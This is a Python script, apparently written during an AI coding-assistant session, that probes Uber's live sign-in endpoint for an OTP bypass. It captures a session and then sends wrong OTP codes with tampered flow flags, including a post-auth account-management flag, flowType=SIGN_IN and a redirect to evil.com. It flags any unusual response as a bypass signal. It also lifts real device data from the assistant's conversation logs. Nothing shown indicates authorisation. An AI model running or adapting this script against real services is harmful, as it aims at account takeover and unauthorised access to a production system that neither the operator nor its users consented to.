 """参数攻击：流程标志参数信任测试（目标：绕过）
流程：从对话历史提取用户最新抓包的 INITIAL payload 字段（真实 deviceData + 邮箱）
  -> 提交 INITIAL 拿新 inAuthSessionID
  -> A 系列 OTP 提交参数变体（错误 OTP 观察业务状态）
只做能改变业务状态的篡改：
  A1 flowType=SIGN_IN（服务端自己会切 flowType，信任边界模糊）
  A2 accountManagementFlow=true + isEmailUpdatePostAuth=true（post-auth 流程标志 pre-auth 使用）
  A3 nextURL=evil.com（跳转信任）
  A4 daffFlow=true
判断标准：仅 EMAIL_OTP_INCORRECT 之外的响应（成功/新屏幕/新错误类型）才可能是绕过信号
"""
import sys, json, uuid, time, re, requests
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://cn-geo1.uber.com/rt/silk-screen"
HIST = r"C:\Users\tndc2\.qoder\cache\projects\scan-72ece876\conversation-history\1bb4bafd\1bb4bafd.jsonl"
EMAIL = "test.probe.2026.insta@gmail.com"
USL_ID = "e78c5663-84e9-4af7-970c-9ac188575784"
ANALYTICS_SID = "8ea4f450-ce1a-43e3-9e86-54112f923140"

SESSION = None  # 运行时由 INITIAL 响应填充

def headers():
    return {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://auth.uber.com",
        "referer": "https://auth.uber.com/",
        "sec-ch-ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
        "x-uber-analytics-session-id": ANALYTICS_SID,
        "x-uber-client-name": "usl_desktop",
        "x-uber-marketing-id": USL_ID,
        "x-uber-request-uuid": str(uuid.uuid4()),
        "x-uber-usl-id": USL_ID,
    }

def initial_payload(flow_type="INITIAL", acct_mgmt=False, daff=False, email_update=False,
                    next_url="https://m.uber.com", email=EMAIL):
    fa = {"flowType": flow_type, "standardFlow": True, "accountManagementFlow": acct_mgmt,
          "daffFlow": daff,
          "productConstraints": {"isEligibleForWebOTPAutofill": False, "uslFELibVersion": "",
                                 "uslMobileLibVersion": "", "isWhatsAppAvailable": False,
                                 "isPublicKeyCredentialSupported": True, "isFacebookAvailable": False,
                                 "isRakutenAvailable": False, "isKakaoAvailable": False},
          "additionalParams": {"isEmailUpdatePostAuth": email_update},
          "deviceData": "REPLACE_WITH_REAL",
          "nextURL": next_url, "uslURL": "https://auth.uber.com/v2/",
          "authDomain": "auth.uber.com",
          "screenAnswers": [{"screenType": "PHONE_NUMBER_INITIAL", "eventType": "TypeInputEmail",
                             "fieldAnswers": [{"fieldType": "EMAIL_ADDRESS", "emailAddress": email}]}]}
    return {"formContainerAnswer": {"inAuthSessionID": "", "formAnswer": fa}}

def otp_payload(session, otp_val, flow_type="SIGN_UP", acct_mgmt=False, daff=False,
                email_update=False, next_url="https://m.uber.com"):
    sa = {"screenType": "EMAIL_OTP_CODE", "eventType": "TypeEmailOTP",
          "fieldAnswers": [{"fieldType": "EMAIL_OTP_CODE", "emailOTPCode": otp_val}]}
    fa = {"flowType": flow_type, "standardFlow": True, "accountManagementFlow": acct_mgmt,
          "daffFlow": daff,
          "productConstraints": {"isEligibleForWebOTPAutofill": False, "uslFELibVersion": "",
                                 "uslMobileLibVersion": "", "isWhatsAppAvailable": False,
                                 "isPublicKeyCredentialSupported": True, "isFacebookAvailable": False,
                                 "isRakutenAvailable": False, "isKakaoAvailable": False},
          "additionalParams": {"isEmailUpdatePostAuth": email_update},
          "deviceData": "AAAA",
          "nextURL": next_url, "uslURL": "https://auth.uber.com/v2/",
          "authDomain": "auth.uber.com",
          "screenAnswers": [sa]}
    return {"formContainerAnswer": {"inAuthSessionID": session, "formAnswer": fa}}

def short(r, n=300):
    try:
        j = r.json()
        s = json.dumps(j, ensure_ascii=False)
        # 压缩屏幕信息：只保留 screenType/flowType/errorType
        return s[:n]
    except Exception:
        return r.text[:n]

def post(path, payload):
    return requests.post(f"{BASE}/{path}", json=payload, headers=headers(), timeout=15)


def latest_from_history():
    """从对话历史提取用户最近抓包的 INITIAL payload 关键字段（确定性来源）"""
    dd, email = None, None
    for line in open(HIST, encoding="utf-8"):
        m = re.search(r'"deviceData":"([^"]+)"', line)
        if m:
            dd = m.group(1)
        m2 = re.search(r'"emailAddress":"([^"]+)"', line)
        if m2:
            email = m2.group(1)
    return dd, email


print("=== 0. 提取最新 INITIAL payload 字段 ===")
dd, email = latest_from_history()
if not dd:
    print("!!! 未找到 deviceData，中止")
    sys.exit(1)
EMAIL = email or EMAIL
print(f"email = {EMAIL} | deviceData len = {len(dd)}")

print("=== 0.1 提交 INITIAL 拿 session（会用新邮箱发 OTP 邮件）===")
initial = initial_payload(email=EMAIL)
initial["formContainerAnswer"]["formAnswer"]["deviceData"] = dd
r = post("submit-form", initial)
print(f"INITIAL: {r.status_code} {short(r, 400)}")
try:
    SESSION = r.json().get("inAuthSessionID", "")
except Exception:
    SESSION = ""
if not SESSION:
    print("!!! 未拿到 inAuthSessionID（deviceData 失效/邮箱状态异常），中止")
    sys.exit(1)
print(f"SESSION = {SESSION}")
time.sleep(2)

print("=== A 系列: OTP 提交参数变体（错误 OTP 观察业务状态）===")
tests = [
    ("A1 flowType=SIGN_IN", otp_payload(SESSION, "1111", flow_type="SIGN_IN")),
    ("A2 accountManagementFlow=true + isEmailUpdatePostAuth=true",
     otp_payload(SESSION, "2222", acct_mgmt=True, email_update=True)),
    ("A3 nextURL=evil.com", otp_payload(SESSION, "3333", next_url="https://evil.com")),
    ("A4 daffFlow=true", otp_payload(SESSION, "4444", daff=True)),
]
for name, p in tests:
    r = post("submit-form", p)
    print(f"{name}: {r.status_code} {short(r, 200)}")
    if "EMAIL_OTP_INCORRECT" in r.text:
        print("    -> 参数被忽略（业务状态未变），无绕过信号")
    else:
        print("    ^^^ 业务状态变化! 绕过信号，需深挖")
    time.sleep(3)

print("\n完成。")
